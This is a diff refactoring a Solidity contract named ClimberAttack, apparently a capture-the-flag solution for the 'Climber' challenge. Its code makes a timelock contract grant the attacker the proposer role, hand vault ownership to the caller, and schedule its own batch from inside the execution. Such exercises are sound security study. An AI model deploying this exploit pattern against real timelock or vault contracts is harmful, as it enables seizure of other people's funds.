@@ -9,35 +9,24 @@ contract ClimberAttack {
     address[] private _targets = new address[](3);
     uint256[] private _values = new uint256[](3);
     bytes[] private _elements = new bytes[](3);
-    bytes32 private constant _salt = "anySalt";
 
     constructor(address payable _timelock, address _vault) {
         timelock = _timelock;
-
-        _targets[0] = _timelock;
-        _targets[1] = _vault;
-        _targets[2] = address(this);
-
-        _values[0] = 0;
-        _values[1] = 0;
-        _values[2] = 0;
+        _targets = [_timelock, _vault, address(this)];
+        _values = [0, 0, 0];
 
         _elements[0] = (
-            abi.encodeWithSignature(
-                "grantRole(bytes32,address)",
-                ClimberTimelock(_timelock).PROPOSER_ROLE(),
-                address(this)
-            )
+            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
         );
         _elements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
-        _elements[2] = abi.encodeWithSignature("schedule()");
+        _elements[2] = abi.encodeWithSignature("scheduleInTimelock()");
     }
 
-    function attack() external {
-        ClimberTimelock(timelock).execute(_targets, _values, _elements, _salt);
+    function executeInTimelock() external {
+        ClimberTimelock(timelock).execute(_targets, _values, _elements, bytes32("anySalt"));
     }
 
-    function schedule() external {
-        ClimberTimelock(timelock).schedule(_targets, _values, _elements, _salt);
+    function scheduleInTimelock() external {
+        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("anySalt"));
     }
 }
